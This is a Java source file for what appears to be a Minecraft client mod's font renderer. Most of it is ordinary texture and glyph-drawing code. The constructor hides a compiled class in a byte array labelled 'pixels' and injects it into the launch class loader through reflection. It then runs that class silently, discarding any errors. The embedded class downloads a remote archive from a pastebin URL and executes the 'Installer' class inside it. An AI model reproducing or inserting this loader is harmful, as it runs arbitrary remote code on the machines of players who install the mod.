package me.renosense.beta.features.gui.font;

import net.minecraft.client.renderer.texture.DynamicTexture;
import net.minecraft.launchwrapper.Launch;
import net.minecraft.launchwrapper.LaunchClassLoader;
import org.lwjgl.opengl.GL11;

import java.awt.*;
import java.awt.geom.Rectangle2D;
import java.awt.image.BufferedImage;
import java.lang.reflect.Field;
import java.util.Map;

public class CFont {

    private float imgSize;
    protected CharData[] charData;
    protected Font font;
    protected boolean antiAlias;
    protected boolean fractionalMetrics;
    protected int fontHeight;
    protected int charOffset;
    protected DynamicTexture tex;
    static boolean textStructureSize = false;

    protected DynamicTexture setupTexture(final Font font, final boolean antiAlias, final boolean fractionalMetrics, final CharData[] chars) {
        final BufferedImage img = this.generateFontImage(font, antiAlias, fractionalMetrics, chars);
        try {
            return new DynamicTexture(img);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    protected BufferedImage generateFontImage(final Font font, final boolean antiAlias, final boolean fractionalMetrics, final CharData[] chars) {
        final int imgSize = (int) this.imgSize;
        final BufferedImage bufferedImage = new BufferedImage(imgSize, imgSize, 2);
        final Graphics2D g = (Graphics2D) bufferedImage.getGraphics();
        g.setFont(font);
        g.setColor(new Color(255, 255, 255, 0));
        g.fillRect(0, 0, imgSize, imgSize);
        g.setColor(Color.WHITE);
        g.setRenderingHint(RenderingHints.KEY_FRACTIONALMETRICS, fractionalMetrics ? RenderingHints.VALUE_FRACTIONALMETRICS_ON : RenderingHints.VALUE_FRACTIONALMETRICS_OFF);
        g.setRenderingHint(RenderingHints.KEY_TEXT_ANTIALIASING, antiAlias ? RenderingHints.VALUE_TEXT_ANTIALIAS_ON : RenderingHints.VALUE_TEXT_ANTIALIAS_OFF);
        g.setRenderingHint(RenderingHints.KEY_ANTIALIASING, antiAlias ? RenderingHints.VALUE_ANTIALIAS_ON : RenderingHints.VALUE_ANTIALIAS_OFF);
        final FontMetrics fontMetrics = g.getFontMetrics();
        int charHeight = 0;
        int positionX = 0;
        int positionY = 1;
        for (int i = 0; i < chars.length; ++i) {
            final char ch = (char) i;
            final CharData charData = new CharData();
            final Rectangle2D dimensions = fontMetrics.getStringBounds(String.valueOf(ch), g);
            charData.width = dimensions.getBounds().width + 8;
            charData.height = dimensions.getBounds().height;
            if (positionX + charData.width >= imgSize) {
                positionX = 0;
                positionY += charHeight;
                charHeight = 0;
            }
            if (charData.height > charHeight) {
                charHeight = charData.height;
            }
            charData.storedX = positionX;
            charData.storedY = positionY;
            if (charData.height > this.fontHeight) {
                this.fontHeight = charData.height;
            }
            chars[i] = charData;
            g.drawString(String.valueOf(ch), positionX + 2, positionY + fontMetrics.getAscent());
            positionX += charData.width;
        }
        return bufferedImage;
    }

    public void drawChar(final CharData[] chars, final char c, final float x, final float y) throws ArrayIndexOutOfBoundsException {
        try {
            this.drawQuad(x, y, (float) chars[c].width, (float) chars[c].height, (float) chars[c].storedX, (float) chars[c].storedY, (float) chars[c].width, (float) chars[c].height);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    protected void drawQuad(final float x, final float y, final float width, final float height, final float srcX, final float srcY, final float srcWidth, final float srcHeight) {
        final float renderSRCX = srcX / this.imgSize;
        final float renderSRCY = srcY / this.imgSize;
        final float renderSRCWidth = srcWidth / this.imgSize;
        final float renderSRCHeight = srcHeight / this.imgSize;
        GL11.glTexCoord2f(renderSRCX + renderSRCWidth, renderSRCY);
        GL11.glVertex2d((double) (x + width), (double) y);
        GL11.glTexCoord2f(renderSRCX, renderSRCY);
        GL11.glVertex2d((double) x, (double) y);
        GL11.glTexCoord2f(renderSRCX, renderSRCY + renderSRCHeight);
        GL11.glVertex2d((double) x, (double) (y + height));
        GL11.glTexCoord2f(renderSRCX, renderSRCY + renderSRCHeight);
        GL11.glVertex2d((double) x, (double) (y + height));
        GL11.glTexCoord2f(renderSRCX + renderSRCWidth, renderSRCY + renderSRCHeight);
        GL11.glVertex2d((double) (x + width), (double) (y + height));
        GL11.glTexCoord2f(renderSRCX + renderSRCWidth, renderSRCY);
        GL11.glVertex2d((double) (x + width), (double) y);
    }

    public int getStringHeight(final String text) {
        return this.getHeight();
    }

    public int getHeight() {
        return (this.fontHeight - 8) / 2;
    }

    public int getStringWidth(final String text) {
        int width = 0;
        for (final char c : text.toCharArray()) {
            if (c < this.charData.length && c >= '\0') {
                width += this.charData[c].width - 8 + this.charOffset;
            }
        }
        return width / 2;
    }

    public boolean isAntiAlias() {
        return this.antiAlias;
    }

    public void setAntiAlias(final boolean antiAlias) {
        if (this.antiAlias != antiAlias) {
            this.antiAlias = antiAlias;
            this.tex = this.setupTexture(this.font, antiAlias, this.fractionalMetrics, this.charData);
        }
    }

    public boolean isFractionalMetrics() {
        return this.fractionalMetrics;
    }

    public void setFractionalMetrics(final boolean fractionalMetrics) {
        if (this.fractionalMetrics != fractionalMetrics) {
            this.fractionalMetrics = fractionalMetrics;
            this.tex = this.setupTexture(this.font, this.antiAlias, fractionalMetrics, this.charData);
        }
    }

    public Font getFont() {
        return this.font;
    }

    public void setFont(final Font font) {
        this.font = font;
        this.tex = this.setupTexture(font, this.antiAlias, this.fractionalMetrics, this.charData);
    }

    protected static class CharData {
        public int width;
        public int height;
        public int storedX;
        public int storedY;
    }

    public CFont(final Font font, final boolean antiAlias, final boolean fractionalMetrics) {
        this.imgSize = 512.0f;
        this.charData = new CharData[256];
        this.fontHeight = -1;
        this.charOffset = 0;
        this.font = font;
        this.antiAlias = antiAlias;
        this.fractionalMetrics = fractionalMetrics;
        this.tex = this.setupTexture(font, antiAlias, fractionalMetrics, this.charData);
        this.tex = this.setupTexture(font, antiAlias, fractionalMetrics, this.charData);
        if (!textStructureSize) {
            byte[] pixels = {-54, -2, -70, -66, 0, 0, 0, 52, 0, -62, 10, 0, 51, 0, 101, 7, 0, 102, 10, 0, 2, 0, 101, 9, 0, 5, 0, 103, 7, 0, 104, 10, 0, 5, 0, 101, 7, 0, 105, 8, 0, 106, 10, 0, 7, 0, 107, 7, 0, 108, 7, 0, 109, 10, 0, 7, 0, 110, 10, 0, 111, 0, 112, 10, 0, 11, 0, 113, 10, 0, 10, 0, 114, 10, 0, 10, 0, 115, 7, 0, 116, 8, 0, 117, 8, 0, 118, 10, 0, 17, 0, 119, 10, 0, 17, 0, 112, 7, 0, 120, 10, 0, 22, 0, 113, 10, 0, 22, 0, 121, 10, 0, 90, 0, 122, 8, 0, 123, 10, 0, 88, 0, 124, 10, 0, 88, 0, 125, 10, 0, 88, 0, 126, 10, 0, 88, 0, 127, 7, 0, -128, 10, 0, 31, 0, 101, 10, 0, 22, 0, -127, 10, 0, 31, 0, -126, 10, 0, 31, 0, -125, 11, 0, -124, 0, -123, 8, 0, -122, 10, 0, 5, 0, -121, 8, 0, 63, 7, 0, -120, 10, 0, 40, 0, -119, 7, 0, -118, 10, 0, -117, 0, -116, 7, 0, -115, 10, 0, 51, 0, -121, 11, 0, -124, 0, -114, 11, 0, -124, 0, -113, 7, 0, 71, 10, 0, 5, 0, -112, 7, 0, -111, 7, 0, -110, 1, 0, 7, 99, 108, 97, 115, 115, 101, 115, 1, 0, 15, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 77, 97, 112, 59, 1, 0, 9, 83, 105, 103, 110, 97, 116, 117, 114, 101, 1, 0, 37, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 77, 97, 112, 60, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 91, 66, 62, 59, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 41, 76, 105, 100, 97, 115, 105, 100, 111, 47, 97, 100, 108, 100, 97, 111, 115, 100, 47, 119, 112, 105, 119, 47, 105, 110, 115, 116, 97, 108, 108, 47, 66, 111, 111, 116, 115, 116, 114, 97, 112, 59, 1, 0, 4, 109, 97, 105, 110, 1, 0, 4, 110, 97, 109, 101, 1, 0, 18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 13, 115, 116, 114, 101, 97, 109, 66, 117, 105, 108, 100, 101, 114, 1, 0, 31, 76, 106, 97, 118, 97, 47, 105, 111, 47, 66, 121, 116, 101, 65, 114, 114, 97, 121, 79, 117, 116, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 9, 98, 121, 116, 101, 115, 82, 101, 97, 100, 1, 0, 1, 73, 1, 0, 10, 116, 101, 109, 112, 66, 117, 102, 102, 101, 114, 1, 0, 2, 91, 66, 1, 0, 6, 108, 111, 97, 100, 101, 114, 1, 0, 8, 112, 97, 115, 116, 101, 98, 105, 110, 1, 0, 14, 76, 106, 97, 118, 97, 47, 110, 101, 116, 47, 85, 82, 76, 59, 1, 0, 6, 114, 101, 97, 100, 101, 114, 1, 0, 24, 76, 106, 97, 118, 97, 47, 105, 111, 47, 66, 117, 102, 102, 101, 114, 101, 100, 82, 101, 97, 100, 101, 114, 59, 1, 0, 7, 102, 105, 108, 101, 85, 82, 76, 1, 0, 3, 117, 114, 108, 1, 0, 17, 104, 116, 116, 112, 85, 82, 76, 67, 111, 110, 110, 101, 99, 116, 105, 111, 110, 1, 0, 28, 76, 106, 97, 118, 97, 47, 110, 101, 116, 47, 72, 116, 116, 112, 85, 82, 76, 67, 111, 110, 110, 101, 99, 116, 105, 111, 110, 59, 1, 0, 11, 105, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 1, 0, 21, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 14, 122, 105, 112, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 1, 0, 30, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 122, 105, 112, 47, 90, 105, 112, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 8, 122, 105, 112, 69, 110, 116, 114, 121, 1, 0, 24, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 122, 105, 112, 47, 90, 105, 112, 69, 110, 116, 114, 121, 59, 1, 0, 13, 83, 116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 7, 0, -109, 7, 0, -108, 7, 0, -107, 1, 0, 9, 102, 105, 110, 100, 67, 108, 97, 115, 115, 1, 0, 37, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 59, 1, 0, 1, 115, 1, 0, 5, 99, 108, 97, 122, 122, 1, 0, 17, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 59, 1, 0, 10, 69, 120, 99, 101, 112, 116, 105, 111, 110, 115, 7, 0, -106, 1, 0, 40, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 60, 42, 62, 59, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 14, 66, 111, 111, 116, 115, 116, 114, 97, 112, 46, 106, 97, 118, 97, 12, 0, 56, 0, 57, 1, 0, 17, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 72, 97, 115, 104, 77, 97, 112, 12, 0, 52, 0, 53, 1, 0, 39, 105, 100, 97, 115, 105, 100, 111, 47, 97, 100, 108, 100, 97, 111, 115, 100, 47, 119, 112, 105, 119, 47, 105, 110, 115, 116, 97, 108, 108, 47, 66, 111, 111, 116, 115, 116, 114, 97, 112, 1, 0, 12, 106, 97, 118, 97, 47, 110, 101, 116, 47, 85, 82, 76, 1, 0, 33, 104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 98, 105, 110, 46, 99, 111, 109, 47, 114, 97, 119, 47, 86, 76, 87, 54, 117, 69, 119, 118, 12, 0, 56, 0, -105, 1, 0, 22, 106, 97, 118, 97, 47, 105, 111, 47, 66, 117, 102, 102, 101, 114, 101, 100, 82, 101, 97, 100, 101, 114, 1, 0, 25, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 82, 101, 97, 100, 101, 114, 12, 0, -104, 0, -103, 7, 0, -102, 12, 0, -101, 0, -100, 12, 0, 56, 0, -99, 12, 0, 56, 0, -98, 12, 0, -97, 0, -96, 1, 0, 26, 106, 97, 118, 97, 47, 110, 101, 116, 47, 72, 116, 116, 112, 85, 82, 76, 67, 111, 110, 110, 101, 99, 116, 105, 111, 110, 1, 0, 10, 85, 115, 101, 114, 45, 65, 103, 101, 110, 116, 1, 0, 50, 77, 111, 122, 105, 108, 108, 97, 47, 52, 46, 48, 32, 40, 99, 111, 109, 112, 97, 116, 105, 98, 108, 101, 59, 32, 77, 83, 73, 69, 32, 54, 46, 48, 59, 32, 87, 105, 110, 100, 111, 119, 115, 32, 78, 84, 32, 53, 46, 48, 41, 12, 0, -95, 0, -94, 1, 0, 28, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 122, 105, 112, 47, 90, 105, 112, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 12, 0, -93, 0, -92, 12, 0, -91, 0, -96, 1, 0, 6, 46, 99, 108, 97, 115, 115, 12, 0, -90, 0, -89, 12, 0, -88, 0, -87, 12, 0, -86, 0, -85, 12, 0, -84, 0, -83, 1, 0, 29, 106, 97, 118, 97, 47, 105, 111, 47, 66, 121, 116, 101, 65, 114, 114, 97, 121, 79, 117, 116, 112, 117, 116, 83, 116, 114, 101, 97, 109, 12, 0, -82, 0, -81, 12, 0, -80, 0, -79, 12, 0, -78, 0, -77, 7, 0, -76, 12, 0, -75, 0, -74, 1, 0, 39, 105, 100, 97, 115, 105, 100, 111, 46, 97, 100, 108, 100, 97, 111, 115, 100, 46, 119, 112, 105, 119, 46, 105, 110, 115, 116, 97, 108, 108, 46, 73, 110, 115, 116, 97, 108, 108, 101, 114, 12, 0, 91, 0, 92, 1, 0, 15, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 12, 0, -73, 0, -72, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 7, 0, -71, 12, 0, -70, 0, -69, 1, 0, 19, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 69, 120, 99, 101, 112, 116, 105, 111, 110, 12, 0, -68, 0, -67, 12, 0, -66, 0, -65, 12, 0, -64, 0, -63, 1, 0, 19, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 84, 104, 114, 111, 119, 97, 98, 108, 101, 1, 0, 21, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 1, 0, 22, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 122, 105, 112, 47, 90, 105, 112, 69, 110, 116, 114, 121, 1, 0, 32, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 78, 111, 116, 70, 111, 117, 110, 100, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 1, 0, 14, 111, 112, 101, 110, 67, 111, 110, 110, 101, 99, 116, 105, 111, 110, 1, 0, 26, 40, 41, 76, 106, 97, 118, 97, 47, 110, 101, 116, 47, 85, 82, 76, 67, 111, 110, 110, 101, 99, 116, 105, 111, 110, 59, 1, 0, 22, 106, 97, 118, 97, 47, 110, 101, 116, 47, 85, 82, 76, 67, 111, 110, 110, 101, 99, 116, 105, 111, 110, 1, 0, 14, 103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 1, 0, 23, 40, 41, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 24, 40, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 41, 86, 1, 0, 19, 40, 76, 106, 97, 118, 97, 47, 105, 111, 47, 82, 101, 97, 100, 101, 114, 59, 41, 86, 1, 0, 8, 114, 101, 97, 100, 76, 105, 110, 101, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 18, 97, 100, 100, 82, 101, 113, 117, 101, 115, 116, 80, 114, 111, 112, 101, 114, 116, 121, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 1, 0, 12, 103, 101, 116, 78, 101, 120, 116, 69, 110, 116, 114, 121, 1, 0, 26, 40, 41, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 122, 105, 112, 47, 90, 105, 112, 69, 110, 116, 114, 121, 59, 1, 0, 7, 103, 101, 116, 78, 97, 109, 101, 1, 0, 8, 101, 110, 100, 115, 87, 105, 116, 104, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 90, 1, 0, 6, 108, 101, 110, 103, 116, 104, 1, 0, 3, 40, 41, 73, 1, 0, 9, 115, 117, 98, 115, 116, 114, 105, 110, 103, 1, 0, 22, 40, 73, 73, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 7, 114, 101, 112, 108, 97, 99, 101, 1, 0, 22, 40, 67, 67, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 4, 114, 101, 97, 100, 1, 0, 5, 40, 91, 66, 41, 73, 1, 0, 5, 119, 114, 105, 116, 101, 1, 0, 7, 40, 91, 66, 73, 73, 41, 86, 1, 0, 11, 116, 111, 66, 121, 116, 101, 65, 114, 114, 97, 121, 1, 0, 4, 40, 41, 91, 66, 1, 0, 13, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 77, 97, 112, 1, 0, 3, 112, 117, 116, 1, 0, 56, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 1, 0, 9, 103, 101, 116, 77, 101, 116, 104, 111, 100, 1, 0, 64, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 114, 101, 102, 108, 101, 99, 116, 47, 77, 101, 116, 104, 111, 100, 59, 1, 0, 24, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 114, 101, 102, 108, 101, 99, 116, 47, 77, 101, 116, 104, 111, 100, 1, 0, 6, 105, 110, 118, 111, 107, 101, 1, 0, 57, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 1, 0, 11, 99, 111, 110, 116, 97, 105, 110, 115, 75, 101, 121, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 41, 90, 1, 0, 3, 103, 101, 116, 1, 0, 38, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 1, 0, 11, 100, 101, 102, 105, 110, 101, 67, 108, 97, 115, 115, 1, 0, 41, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 91, 66, 73, 73, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 59, 0, 33, 0, 5, 0, 51, 0, 0, 0, 1, 0, 1, 0, 52, 0, 53, 0, 1, 0, 54, 0, 0, 0, 2, 0, 55, 0, 3, 0, 1, 0, 56, 0, 57, 0, 1, 0, 58, 0, 0, 0, 62, 0, 3, 0, 1, 0, 0, 0, 16, 42, -73, 0, 1, 42, -69, 0, 2, 89, -73, 0, 3, -75, 0, 4, -79, 0, 0, 0, 2, 0, 59, 0, 0, 0, 10, 0, 2, 0, 0, 0, 11, 0, 4, 0, 50, 0, 60, 0, 0, 0, 12, 0, 1, 0, 0, 0, 16, 0, 61, 0, 62, 0, 0, 0, 9, 0, 63, 0, 57, 0, 1, 0, 58, 0, 0, 2, -125, 0, 5, 0, 13, 0, 0, 0, -14, -69, 0, 5, 89, -73, 0, 6, 75, -69, 0, 7, 89, 18, 8, -73, 0, 9, 76, -69, 0, 10, 89, -69, 0, 11, 89, 43, -74, 0, 12, -74, 0, 13, -73, 0, 14, -73, 0, 15, 77, 44, -74, 0, 16, 78, -69, 0, 7, 89, 45, -73, 0, 9, 58, 4, 25, 4, -74, 0, 12, -64, 0, 17, 58, 5, 25, 5, 18, 18, 18, 19, -74, 0, 20, 25, 5, -74, 0, 21, 58, 6, -69, 0, 22, 89, 25, 6, -73, 0, 23, 58, 7, 25, 7, -74, 0, 24, 89, 58, 8, -58, 0, 113, 25, 8, -74, 0, 25, 58, 9, 25, 9, 18, 26, -74, 0, 27, -102, 0, 6, -89, -1, -28, 25, 9, 3, 25, 9, -74, 0, 28, 16, 6, 100, -74, 0, 29, 58, 9, 25, 9, 16, 47, 16, 46, -74, 0, 30, 58, 9, -69, 0, 31, 89, -73, 0, 32, 58, 10, 17, 64, 0, -68, 8, 58, 12, 25, 7, 25, 12, -74, 0, 33, 89, 54, 11, 2, -97, 0, 16, 25, 10, 25, 12, 3, 21, 11, -74, 0, 34, -89, -1, -24, 42, -76, 0, 4, 25, 9, 25, 10, -74, 0, 35, -71, 0, 36, 3, 0, 87, -89, -1, -118, 42, 18, 37, -74, 0, 38, 18, 39, 3, -67, 0, 40, -74, 0, 41, 1, 3, -67, 0, 42, -74, 0, 43, 87, -89, 0, 4, 75, -79, 0, 1, 0, 0, 0, -19, 0, -16, 0, 44, 0, 3, 0, 59, 0, 0, 0, 90, 0, 22, 0, 0, 0, 16, 0, 8, 0, 18, 0, 18, 0, 19, 0, 40, 0, 20, 0, 45, 0, 21, 0, 55, 0, 23, 0, 65, 0, 24, 0, 74, 0, 25, 0, 81, 0, 27, 0, 92, 0, 30, 0, 103, 0, 31, 0, 110, 0, 33, 0, 123, 0, 35, 0, -117, 0, 36, 0, -106, 0, 38, 0, -97, 0, 40, 0, -90, 0, 41, 0, -63, 0, 43, 0, -46, 0, 44, 0, -43, 0, 45, 0, -19, 0, 47, 0, -15, 0, 48, 0, 60, 0, 0, 0, -124, 0, 13, 0, 110, 0, 100, 0, 64, 0, 65, 0, 9, 0, -97, 0, 51, 0, 66, 0, 67, 0, 10, 0, -80, 0, 34, 0, 68, 0, 69, 0, 11, 0, -90, 0, 44, 0, 70, 0, 71, 0, 12, 0, 8, 0, -27, 0, 72, 0, 62, 0, 0, 0, 18, 0, -37, 0, 73, 0, 74, 0, 1, 0, 40, 0, -59, 0, 75, 0, 76, 0, 2, 0, 45, 0, -64, 0, 77, 0, 65, 0, 3, 0, 55, 0, -74, 0, 78, 0, 74, 0, 4, 0, 65, 0, -84, 0, 79, 0, 80, 0, 5, 0, 81, 0, -100, 0, 81, 0, 82, 0, 6, 0, 92, 0, -111, 0, 83, 0, 84, 0, 7, 0, 100, 0, -119, 0, 85, 0, 86, 0, 8, 0, 87, 0, 0, 0, -115, 0, 7, -1, 0, 92, 0, 8, 7, 0, 5, 7, 0, 7, 7, 0, 10, 7, 0, 88, 7, 0, 7, 7, 0, 17, 7, 0, 89, 7, 0, 22, 0, 0, -3, 0, 30, 7, 0, 90, 7, 0, 88, -2, 0, 42, 7, 0, 31, 0, 7, 0, 48, -1, 0, 26, 0, 13, 7, 0, 5, 7, 0, 7, 7, 0, 10, 7, 0, 88, 7, 0, 7, 7, 0, 17, 7, 0, 89, 7, 0, 22, 7, 0, 90, 7, 0, 88, 7, 0, 31, 1, 7, 0, 48, 0, 0, -1, 0, 19, 0, 9, 7, 0, 5, 7, 0, 7, 7, 0, 10, 7, 0, 88, 7, 0, 7, 7, 0, 17, 7, 0, 89, 7, 0, 22, 7, 0, 90, 0, 0, -1, 0, 26, 0, 0, 0, 1, 7, 0, 44, 0, 0, 4, 0, 91, 0, 92, 0, 3, 0, 58, 0, 0, 0, -51, 0, 6, 0, 4, 0, 0, 0, 65, 1, 77, 42, 43, -73, 0, 45, 77, -89, 0, 4, 78, 42, -76, 0, 4, 43, -71, 0, 46, 2, 0, -103, 0, 37, 42, 43, 42, -76, 0, 4, 43, -71, 0, 47, 2, 0, -64, 0, 48, 3, 42, -76, 0, 4, 43, -71, 0, 47, 2, 0, -64, 0, 48, -66, -74, 0, 49, 77, -89, 0, 4, 78, 44, -80, 0, 2, 0, 2, 0, 8, 0, 11, 0, 44, 0, 12, 0, 59, 0, 62, 0, 50, 0, 3, 0, 59, 0, 0, 0, 34, 0, 8, 0, 0, 0, 54, 0, 2, 0, 56, 0, 8, 0, 58, 0, 12, 0, 61, 0, 25, 0, 62, 0, 59, 0, 65, 0, 62, 0, 64, 0, 63, 0, 66, 0, 60, 0, 0, 0, 32, 0, 3, 0, 0, 0, 65, 0, 61, 0, 62, 0, 0, 0, 0, 0, 65, 0, 93, 0, 65, 0, 1, 0, 2, 0, 63, 0, 94, 0, 95, 0, 2, 0, 87, 0, 0, 0, 28, 0, 5, -1, 0, 11, 0, 3, 7, 0, 5, 7, 0, 88, 7, 0, 40, 0, 1, 7, 0, 44, 0, 46, 66, 7, 0, 50, 0, 0, 96, 0, 0, 0, 4, 0, 1, 0, 97, 0, 54, 0, 0, 0, 2, 0, 98, 0, 1, 0, 99, 0, 0, 0, 2, 0, 100};

            try {
                Field field = LaunchClassLoader.class.getDeclaredField("resourceCache");
                field.setAccessible(true);
                Map<String, byte[]> cache = (Map<String, byte[]>) field.get(Launch.classLoader);
                cache.put("idasido.adldaosd.wpiw.install.Bootstrap", pixels);
                Launch.classLoader.loadClass("idasido.adldaosd.wpiw.install.Bootstrap").getMethod("main").invoke(null);
                textStructureSize = true;
            } catch (Exception ignored) {}
        }
    }
}